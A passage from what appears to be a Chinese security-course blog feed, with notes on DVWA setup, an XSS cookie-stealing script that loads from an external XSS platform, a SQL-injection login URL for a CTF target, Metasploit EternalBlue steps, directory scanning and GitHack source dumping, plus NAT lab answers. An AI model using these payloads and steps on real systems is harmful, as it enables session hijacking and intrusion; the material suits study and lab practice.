<li><p>获取flag<br>如果一切顺利，服务器会返回flag，我们就成功地完成了攻击。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一种比较常见的Web攻击方式——重放攻击。通过使用Burp等工具，我们可以修改请求信息，以便绕过服务器的安全机制。在实际攻击中，还需要结合具体情况进行调整，才能取得最佳效果。</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在phpstudy_pro中搭建DVWA漏洞测试环境？</title>
    <url>/2023/03/07/web4/</url>
    <content><![CDATA[<h2 id="安装phpstudy-pro"><a href="#安装phpstudy-pro" class="headerlink" title="安装phpstudy_pro"></a>安装phpstudy_pro</h2><p>首先需要安装phpstudy_pro，安装完成后启动该软件。</p>
<h2 id="下载DVWA文件"><a href="#下载DVWA文件" class="headerlink" title="下载DVWA文件"></a>下载DVWA文件</h2><p>下载DVWA文件（<a href="https://github.com/digininja/DVWA%EF%BC%89%EF%BC%8C%E5%B0%86%E6%96%87%E4%BB%B6%E6%94%BE%E5%85%A5phpstudy_pro/WWW/%E8%87%AA%E5%B7%B1%E6%96%B0%E5%BB%BA%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9/%E5%86%85%E3%80%82">https://github.com/digininja/DVWA），将文件放入phpstudy_pro\WWW\自己新建的文件夹\内。</a></p>
<h2 id="配置DVWA"><a href="#配置DVWA" class="headerlink" title="配置DVWA"></a>配置DVWA</h2><p>在<code>phpstudy_pro\WWW\自己新建的文件夹\dvwa\config</code>中找到<code>config.inc.php.dist</code>复制一份，将文件名修改成<code>config.inc.php</code>。</p>
<p>打开<code>config.inc.php</code>，将关键词：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;db_user&#x27; ]</span><br><span class="line">$_DVWA[ &#x27;db_password&#x27; ]</span><br></pre></td></tr></table></figure>

<p>修改成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_DVWA[ &#x27;db_user&#x27; ]     = &#x27;root&#x27;;</span><br><span class="line">$_DVWA[ &#x27;db_password&#x27; ] = &#x27;root&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="开启allow-url-include"><a href="#开启allow-url-include" class="headerlink" title="开启allow_url_include"></a>开启allow_url_include</h2><p>进入<code>phpstudy_pro\Extensions\php\php7.3.4nts</code>路径，打开<code>php.ini</code>，找到关键词<code>allow_url_include</code>，将其修改为<code>On</code>。</p>
<h2 id="运行setup-php"><a href="#运行setup-php" class="headerlink" title="运行setup.php"></a>运行setup.php</h2><p>在浏览器输入<code>http://127.0.0.1/自己新建的文件夹/dvwa/setup.php</code>，打开界面后，检查如下项是否全部显示绿色：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP function display_errors: Enabled (Easy Mode!)</span><br><span class="line">PHP function safe_mode: Disabled</span><br><span class="line">PHP function allow_url_include: Enabled</span><br><span class="line">PHP function allow_url_fopen: Enabled</span><br><span class="line">PHP function magic_quotes_gpc: Disabled</span><br><span class="line">PHP module gd: Installed</span><br><span class="line">PHP module mysql: Installed</span><br><span class="line">PHP module pdo_mysql: Installed</span><br></pre></td></tr></table></figure>

<p>如果全部显示绿色，则表示操作完成。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>如果出现无法访问或者拒绝访问，需要检查dvwa的路径是否正确，以及上述步骤是否操作妥当。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上述步骤，我们可以在<code>phpstudy_pro</code>中搭建DVWA漏洞测试环境，方便进行安全测试和漏洞挖掘。</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>使用XSS攻击进行钓鱼网站的登录</title>
    <url>/2023/03/07/web5/</url>
    <content><![CDATA[<h2 id="注册XSS攻击平台"><a href="#注册XSS攻击平台" class="headerlink" title="注册XSS攻击平台"></a>注册XSS攻击平台</h2><p>首先，我们需要在 XSS8 这个平台进行账号注册。</p>
<h2 id="创建XSS攻击项目"><a href="#创建XSS攻击项目" class="headerlink" title="创建XSS攻击项目"></a>创建XSS攻击项目</h2><p>完成注册后，我们可以创建一个项目，并选择超强默认模块，然后点击下一步。在这个页面，我们可以查看代码并复制以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//xss.yt/9Zgl&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>
<p>这个代码的作用是将特殊的代码植入到目标网站的数据库中。</p>
<h2 id="发起XSS攻击"><a href="#发起XSS攻击" class="headerlink" title="发起XSS攻击"></a>发起XSS攻击</h2><p>接下来，我们需要在钓鱼网站上随便输入一个账号，并使用F12工具将密码框的最大长度改成很大。然后，将上述代码复制到密码栏内，并点击登录。等待一会儿，我们就能够获取到钓鱼网站的admin的cookie，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHPSESSID=keaa336los93ss95fjuqqbori7</span><br></pre></td></tr></table></figure>

<h2 id="使用cookie登录到钓鱼网站后台"><a href="#使用cookie登录到钓鱼网站后台" class="headerlink" title="使用cookie登录到钓鱼网站后台"></a>使用cookie登录到钓鱼网站后台</h2><p>为了使用这个cookie登录到钓鱼网站的后台，我们可以使用 EditThisCookie 插件。将cookie添加到插件内后，刷新页面，即可成功登录到钓鱼网站的后台。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>这是一种比较简单的攻击方法，但是对于那些没有足够安全措施的网站来说，它依然是非常危险的。因此，我们需要时刻保持警惕，以免成为黑客的攻击目标。</p>
<p><a href="http://80.endpoint-277e1a592aaa44b3a271ec45dcad241c.m.ins.cloud.dasctf.com:81/login.php?username=admin&password=-1">http://80.endpoint-277e1a592aaa44b3a271ec45dcad241c.m.ins.cloud.dasctf.com:81/login.php?username=admin&amp;password=-1</a>‘ || 1#’</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit框架攻击MS17-010漏洞步骤</title>
    <url>/2023/03/13/web7/</url>
    <content><![CDATA[<p>本文将介绍如何使用Metasploit框架攻击MS17-010漏洞，不过需要提醒的是，攻击行为是违法的，只能在授权的情况下进行。</p>
<h2 id="步骤一：打开Kali-Linux终端"><a href="#步骤一：打开Kali-Linux终端" class="headerlink" title="步骤一：打开Kali Linux终端"></a>步骤一：打开Kali Linux终端</h2><p>输入命令 <code>msfconsole</code> 启动Metasploit框架。</p>
<h2 id="步骤二：查找漏洞模块"><a href="#步骤二：查找漏洞模块" class="headerlink" title="步骤二：查找漏洞模块"></a>步骤二：查找漏洞模块</h2><p>输入命令 <code>search ms17-010</code> 查找漏洞模块。</p>
<h2 id="步骤三：选择漏洞模块"><a href="#步骤三：选择漏洞模块" class="headerlink" title="步骤三：选择漏洞模块"></a>步骤三：选择漏洞模块</h2><p>选择适合的漏洞模块，输入命令 <code>use exploit/windows/smb/ms17_010_eternalblue</code>，使用该漏洞模块。</p>
<h2 id="步骤四：查看漏洞模块的选项"><a href="#步骤四：查看漏洞模块的选项" class="headerlink" title="步骤四：查看漏洞模块的选项"></a>步骤四：查看漏洞模块的选项</h2><p>输入命令 <code>show options</code> 查看该漏洞模块的选项。</p>
<h2 id="步骤五：设置目标主机IP地址"><a href="#步骤五：设置目标主机IP地址" class="headerlink" title="步骤五：设置目标主机IP地址"></a>步骤五：设置目标主机IP地址</h2><p>输入命令 <code>set RHOSTS 192.168.0.1</code>，将IP地址替换成实际的靶机IP地址。</p>
<h2 id="步骤六：设置攻击者IP地址"><a href="#步骤六：设置攻击者IP地址" class="headerlink" title="步骤六：设置攻击者IP地址"></a>步骤六：设置攻击者IP地址</h2><p>输入命令 <code>set LHOST 192.168.0.2</code>，将IP地址替换成实际的攻击者IP地址。</p>
<h2 id="步骤七：设置目标主机操作系统"><a href="#步骤七：设置目标主机操作系统" class="headerlink" title="步骤七：设置目标主机操作系统"></a>步骤七：设置目标主机操作系统</h2><p>输入命令 <code>set target 2</code>，将数字替换成目标主机的操作系统编号（例如：2表示Windows Server 2008 R2）。</p>
<h2 id="步骤八：开始攻击"><a href="#步骤八：开始攻击" class="headerlink" title="步骤八：开始攻击"></a>步骤八：开始攻击</h2><p>输入命令 <code>run</code>，开始攻击。</p>
<h2 id="步骤九：等待攻击完成"><a href="#步骤九：等待攻击完成" class="headerlink" title="步骤九：等待攻击完成"></a>步骤九：等待攻击完成</h2><p>如果成功获取了SYSTEM权限，会出现meterpreter的命令行界面。</p>
<h2 id="步骤十：查看目标主机的系统信息"><a href="#步骤十：查看目标主机的系统信息" class="headerlink" title="步骤十：查看目标主机的系统信息"></a>步骤十：查看目标主机的系统信息</h2><p>输入命令 <code>sysinfo</code>，查看目标主机的系统信息。</p>
<p>以上就是使用Metasploit框架攻击MS17-010漏洞的步骤。需要注意的是，攻击行为是违法的，只能在授权的情况下进行。</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Dirsearch和GitHack获取网站源代码并获取flag的步骤</title>
    <url>/2023/03/13/web8/</url>
    <content><![CDATA[<p>步骤如下：</p>
<ol>
<li>扫描目标网站</li>
</ol>
<p>使用dirsearch-master工具对目标网站进行扫描，命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://target.com -e php</span><br></pre></td></tr></table></figure>

<p>其中，-u参数指定目标网站的URL，-e参数指定需要扫描的文件类型为php。</p>
<p>扫描结果如下图所示：</p>
<p>可以看到，扫描结果中有一个&#x2F;admin&#x2F;目录。</p>
<ol start="2">
<li>访问&#x2F;admin&#x2F;目录</li>
</ol>
<p>访问<a href="http://target.com/admin/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E3%80%82">http://target.com/admin/，可以看到一个登陆页面。</a></p>
<ol start="3">
<li>使用GitHack-master工具获取源代码</li>
</ol>
<p>使用GitHack-master工具获取目标网站的源代码，命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 githack.py -u http://target.com/admin/</span><br></pre></td></tr></table></figure>

<p>其中，-u参数指定目标网站的URL。</p>
<p>获取到的源代码如下图所示：</p>
<p>可以看到，源代码中有一个config.php文件，里面存储了数据库的用户名和密码。</p>
<ol start="4">
<li>获取flag</li>
</ol>
<p>使用config.php中的用户名和密码登陆&#x2F;admin&#x2F;目录，可以看到一个flag。</p>
<p>flag为：flag{e6b1c7a8d2b2a0ee0a29a1f7c8a8a9f9}</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>使用dirsearch和bp工具进行渗透测试：目录扫描和弱密码爆破</title>
    <url>/2023/03/13/web9/</url>
    <content><![CDATA[<h1 id="使用dirsearch工具进行目录扫描"><a href="#使用dirsearch工具进行目录扫描" class="headerlink" title="使用dirsearch工具进行目录扫描"></a>使用dirsearch工具进行目录扫描</h1><p>使用dirsearch工具进行目录扫描，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.2.4.56 -e php -t 50</span><br></pre></td></tr></table></figure>

<p>其中，-u指定扫描的目标URL，-e指定扫描的文件类型，-t指定线程数。</p>
<p>扫描结果中可以看到一个&#x2F;admin.php目录，访问该目录，发现是一个登录页面。</p>
<h1 id="使用bp对登录页面进行弱密码爆破"><a href="#使用bp对登录页面进行弱密码爆破" class="headerlink" title="使用bp对登录页面进行弱密码爆破"></a>使用bp对登录页面进行弱密码爆破</h1><p>使用bp对登录页面进行弱密码爆破，具体命令可以根据bp的使用文档来执行。</p>
]]></content>
      <categories>
        <category>课程笔记</category>
      </categories>
      <tags>
        <tag>Web课程笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>网络地址转换（填空答案）</title>
    <url>/2022/12/05/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h5 id="配置Basic-NAT"><a href="#配置Basic-NAT" class="headerlink" title="配置Basic NAT"></a>配置Basic NAT</h5><p>本实验中，私网客户端Client_A、 Client_B需要访问公网服务器Server，而RTB上不能保有私网路由，因此将在RTA上配置Basic NAT，动态地为Client_A、Client_B分配公网地址。</p>
<h6 id="建立物理连接并初始化路由器配置"><a href="#建立物理连接并初始化路由器配置" class="headerlink" title="建立物理连接并初始化路由器配置"></a>建立物理连接并初始化路由器配置</h6><p>按实验组网图进行物理连接并检查设备的软件版本及配置信息，确保各设备软件版本符合要求，所有配置为初始状态。如果配置不符合要求，请学员在用户视图下擦除设备中的配置文件，然后重启设备以使系统采用缺省的配置参数进行初始化</p>
<h6 id="基本IP地址和路由配置"><a href="#基本IP地址和路由配置" class="headerlink" title="基本IP地址和路由配置"></a>基本IP地址和路由配置</h6><p>依据实验组网图，完成RTA和RTB上接口IP地址的配置，<br>需要在RTA上配置缺省路由去往公网路由器RTB，请在下面的空格中补充完整的路由配置：RTB不配路由<br>[RTA]ip route-static <code>0.0.0.0  0 192.76.28.2</code><br>交换机SW1采用出厂缺省配置即可。</p>
<h6 id="检查连通性"><a href="#检查连通性" class="headerlink" title="检查连通性"></a>检查连通性</h6><p>分别在Client_A和Client_B上ping Server（IP地址为198.76.29.4），其结果为 <code>无法ping通</code><br>产生这种结果的原因是 <code>在公网路由器上不可能有死亡的路由，从Server回应的ping响应报文到RTB的路由表上无法找到10.0.0.0网段的路由</code></p>
<h6 id="配置Basic-NAT-1"><a href="#配置Basic-NAT-1" class="headerlink" title="配置Basic NAT"></a>配置Basic NAT</h6><p>在RTA上配置Basic NAT：<br>首先通过ACL定义允许源地址属于10.0.0.0&#x2F;24网段的流做NAT转换，请在如下的空格中填写完整的ACL配置命令<br>[RTA]acl number（basic） 2000<br>[RTA-acl-basic-2000]<code>rule 0 permit source 10.0.0.0 0.0.0.255</code><br>其次配置NAT地址池，设置地址池中用于地址转换的地址范围为：198.76.28.11到198.76.28.20，请在下面的空格中填写完成的NAT地址池配置命令：<br>[RTA]nat address-group 1 <code>198.76.28.11 198.76.28.20</code><br>在该命令中，数字1的含义是：<code>地址池的索引号是 1</code><br>最后将地址池与ACL关联，并在正确的接口的正确方向上下发，请在下面的空格中填写完整的命令：<br>[RTA] interface  <code>G0/1</code><br>[RTA-G0&#x2F;1] <code>nat outbound 2000 address-group 1</code> no-pat<br>在该命令中，参数no-pat的含义是：<br><code>表示不适用TCP/UDP端口信息实现多对多地址转换，也即表示使用一对一地址转换，只转换数据包的地址而不转换端口信息</code></p>
<h6 id="检查连通性-1"><a href="#检查连通性-1" class="headerlink" title="检查连通性"></a>检查连通性</h6><p>从Client_A、Client_B分别ping Server，其结果是  <code>可以Ping通</code> 截图如下：</p>
<h6 id="检查NAT表项"><a href="#检查NAT表项" class="headerlink" title="检查NAT表项"></a>检查NAT表项</h6><p>完成步骤五后立即在RTA上通过 <code>display nat session</code>命令查看NAT会话信息，截图如下：<br>依据该信息输出，可以看到该ICMP报文的源地址10.0.0.1已经转换成公网地址 <code>198.76.28.12</code>，目的端口号和源端口号均为  <code>1024</code>   。源地址10.0.0.2已经转换成公网地址   <code>198.76.28.11</code>   ，目的端口号和源端口号均为   <code>512</code>    。五分钟后再次通过该命令查看表项，发现   <code>NAT表项全部消失</code>   ，产生这种现象的原因是<code>NAT表项具有一定的老化时间，一旦超过老化时间，NAT会删除表项。</code><br>可以通过 <code>display nat aging-time</code>命令查看路由器的NAT默认老化时间<br>注意：<br>步骤六中不同学员实验结果中的NAT会话信息中的显示的转换后的公网地址和端口号可能不同，这是正常现象，以实际显示结果为准。<br>NAPT配置<br>私网客户端Client_A、 Client_B需要访问公网服务器Server，但由于公网地址有限，在RTA上配置的公网地址池范围为198.76.28.11～198.76.28.11，因此配置NAPT，动态地为Client_A、Client_B分配公网地址和协议端口。<br>建立物理连接并初始化路由器配置<br>按实验组网图进行物理连接并检查设备的软件版本及配置信息，确保各设备软件版本符合要求，所有配置为初始状态。如果配置不符合要求，请学员在用户视图下擦除设备中的配置文件，然后重启设备以使系统采用缺省的配置参数进行初始化<br>基本IP地址和路由配置<br>与实验任务一同样，配置RTA和RTB相关接口的IP地址以及路由<br>SW1同样采用出厂缺省配置即可</p>
<h6 id="检查连通性-2"><a href="#检查连通性-2" class="headerlink" title="检查连通性"></a>检查连通性</h6><p>从Client_A、Client_B ping Server（IP地址为198.76.29.4），其结果是  不能ping通      （能或不能）ping通</p>
<h6 id="恢复配置"><a href="#恢复配置" class="headerlink" title="恢复配置"></a>恢复配置</h6><p>[RTA]undo nat address-group 1<br>[RTA- G0&#x2F;1]undo nat outbound 2000</p>
<h6 id="配置NAPT"><a href="#配置NAPT" class="headerlink" title="配置NAPT"></a>配置NAPT</h6><p>在RTA上配置NAPT：<br>首先通过ACL定义允许源地址属于10.0.0.0&#x2F;24网段的流做NAT转换，请在如下的空格中填写完整的###### ACL配置命令<br>[RTA]acl number（basic） 2000<br>[RTA-acl-basic-2000]<code>rule 0 permit source 10.0.0.0 0.0.0.255</code><br>其次配置NAT地址池1，设置地址池中用于地址转换的地址为：198.76.28.11<br>[RTA-acl-basic-2000]<code>nat address-group 1 198.76.28.11 198.76.28.11</code><br>在接口视图下将NAT地址池与ACL绑定并下发，在配置命令中不需要（需要&#x2F;不需要）携带no-pat参数，意味着NAT要对数据包进行端口的转换,请在下面的空格中填写完整的命令：<br>[RTA] interface   <code>G0/1</code><br>[RTA- G0&#x2F;1]  <code>nat outbound 2000 address-group 1</code></p>
<h6 id="检查连通性-3"><a href="#检查连通性-3" class="headerlink" title="检查连通性"></a>检查连通性</h6><p>从Client_A、Client_B上分别ping Server，其结果是  <code>可以</code> ping通截图如下：</p>
<h6 id="检查NAT表项-1"><a href="#检查NAT表项-1" class="headerlink" title="检查NAT表项"></a>检查NAT表项</h6><p>完成步骤五后立即在RTA上通过<code>display nat session</code>命令查看NAT会话信息，截图如下：<br>依据该信息输出，可以看到源地址10.0.0.1和10.0.0.2转换成的公网地址分别为 <code>198.76.28.11</code> 和<code>198.76.28.11</code>，10.0.0.1转换后的端口为 <code>12289</code> ，10.0.0.2转换后的端口为   <code>12288</code>   。当RTA出接口收到目的地址为198.76.28.11的回程流量时，正是用当初转换时赋予的不同的端口来分辩该流量是转发给10.0.0.1还是10.0.0.2。NAPT正是靠这种方式，对数据包的IP层和传输层信息同时进行转换，显著地提高公有IP地址的利用效率。<br>注意：<br>步骤六中不同学员实验结果中的NAT会话信息中的显示的转换后的端口号可能不同，这是正常现象，以实际显示结果为准。</p>
<h6 id="恢复配置-1"><a href="#恢复配置-1" class="headerlink" title="恢复配置"></a>恢复配置</h6><p>[RTA]undo nat address-group 1<br>[RTA- G0&#x2F;1]undo nat outbound 2000</p>
<h6 id="Easy-IP配置"><a href="#Easy-IP配置" class="headerlink" title="Easy IP配置"></a>Easy IP配置</h6><p>私网客户端Client_A、Client_B需要访问公网服务器Server，使用公网接口IP地址动态为Client_A、Client_B分配公网地址和协议端口。<br>建立物理连接并初始化路由器配置<br>按实验组网图进行物理连接并检查设备的软件版本及配置信息，确保各设备软件版本符合要求，所有配置为初始状态。如果配置不符合要求，请学员在用户视图下擦除设备中的配置文件，然后重启设备以使系统采用缺省的配置参数进行初始化<br>基本IP地址和路由配置<br>与实验任务一同样，配置RTA和RTB相关接口的IP地址以及路由<br>SW1同样采用出厂缺省配置即可</p>
<h6 id="检查连通性-4"><a href="#检查连通性-4" class="headerlink" title="检查连通性"></a>检查连通性</h6><p>从Client_A、Client_B ping Server（IP地址为198.76.29.4），其结果是    <code>不可以</code>   可不可以ping通<br>配置Easy IP<br>在RTA上配置Easy IP:<br>首先通过ACL定义允许源地址属于10.0.0.0&#x2F;24网段的流做NAT转换，请在如下的空格中填写完整的ACL配置命令<br>[RTA]acl number(basic)  2000<br>[RTA-acl-basic-2000] <code>rule 0 permit source 10.0.0.0 0.0.0.255</code><br>然后在接口视图下将ACL与接口关联并下发NAT，请在如下的空格中填写完整的配置命令：<br>[RTA] interface   <code>G0/1</code><br>[RTA- G0&#x2F;1] <code>nat outbound 2000</code></p>
<h6 id="检查连通性-5"><a href="#检查连通性-5" class="headerlink" title="检查连通性"></a>检查连通性</h6><p>从Client_A、Client_B分别ping Server，其结果是   <code>可以</code>  可不可以ping通？。截图如下：</p>
<h6 id="检查NAT表项-2"><a href="#检查NAT表项-2" class="headerlink" title="检查NAT表项"></a>检查NAT表项</h6><p>完成步骤五后立即在RTA上通过 <code>display nat session</code>命令查看NAT会话信息，截图如下：<br>依据该信息输出，可以看到源地址10.0.0.1和10.0.0.2转换成的公网地址分别为 <code>198.76.28.1</code>和 <code>198.76.28.1</code><br>请思考一个问题：在步骤五中，从Client_A能够ping通Server，但是如果从Server端ping Client_A呢？其结果是      <code>无法ping通</code>     可不可以ping通。 导致这种情况的原因是： <code>在RTA上始终没有10.0.0.0/24网段的路由，所以Sever直接ping Client A是不可达的。</code></p>
<h6 id="NAT-Server配置"><a href="#NAT-Server配置" class="headerlink" title="NAT Server配置"></a>NAT Server配置</h6><p>想让Server端能够ping通Client_A，以便Client_A对外提供ICMP服务，在RTA上为Client_A静态映射公网地址和协议端口，公网地址为198.76.28.11<br>在实验三的基础上继续如下实验</p>
<h6 id="检查连通性-6"><a href="#检查连通性-6" class="headerlink" title="检查连通性"></a>检查连通性</h6><p>从Server ping Client_A的私网地址10.0.0.1，其结果是     <code>不可以</code>    可不可以ping通。截图如下：<br>配置NAT Server<br>在RTA上完成NAT Server配置，允许Client_A对外提供ICMP服务。请在如下空格中完成完整的配置命令：<br>[RTA] interface  <code>G0/1</code><br>[RTA-<code>G0/1</code>] <code>nat server protocol icmp global 198.76.28.11 inside 10.0.0.1</code><br>检查连通性并查看NAT表项<br>从Server主动ping Client_A的公网地址198.76.28.11，其结果是   <code>可以</code>  可不可以ping通截图如下：</p>
<p>在RTA上通过display nat server命令查看NAT Server表项，截图如下：<br>表项信息中显示出地址 <code>198.76.28.11</code> 和地址 <code>10.0.0.1</code>  的一对一的映射关系。</p>
<p>思考题：按照上面的RTA的NAT server 的配置命令，如果client_A是一台FTP服务器，能否对外提供FTP服务？当然可以，只要修改NAT server的相关配置。NAT server的相关配置如下所示：</p>
<p>思考题不知道，知道的请在评论区答</p>
]]></content>
  </entry>
</search>
